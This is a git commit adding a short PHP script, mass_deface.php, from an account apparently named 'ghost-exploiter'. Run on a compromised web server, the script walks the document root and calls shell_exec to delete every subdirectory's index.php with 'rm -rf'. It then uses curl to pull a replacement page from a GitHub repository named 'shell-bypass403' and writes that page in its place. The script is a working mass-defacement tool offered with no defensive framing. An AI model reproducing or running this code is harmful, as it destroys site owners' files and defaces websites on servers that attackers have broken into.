0380f261cc921cbf07225765256e518bb074cd54
ghost-exploiter <55024592+ghost-exploiter@users.noreply.github.com>
2023-03-16 06:47:15 +0700

    Create mass_deface.php

---
+++ mass_deface.php
@@ -0,0 +1,24 @@
+<?php
+
+    $dir_path = $_SERVER['DOCUMENT_ROOT'];
+
+    $dirscan = array_diff(scandir($dir_path), array(".", ".."));;
+
+    $dir_list = array();
+
+    foreach ($dirscan as $dir) {
+        if (is_dir($dir_path . "/" . $dir)) { // memeriksa apakah file tersebut direktori
+            // $dir_list[] = $dir; // jika iya, tambahkan ke daftar direktori
+
+            $directory = $dir_path . '/' . $dir;
+
+            $listing_dir = $directory . '/' . 'index.php';
+
+            shell_exec('rm -rf ' . $listing_dir);
+
+            shell_exec('curl https://raw.githubusercontent.com/ghost-exploiter/shell-bypass403/master/tes.html >> ' . $listing_dir);
+        }
+    }
+    echo "success"
+
+?>
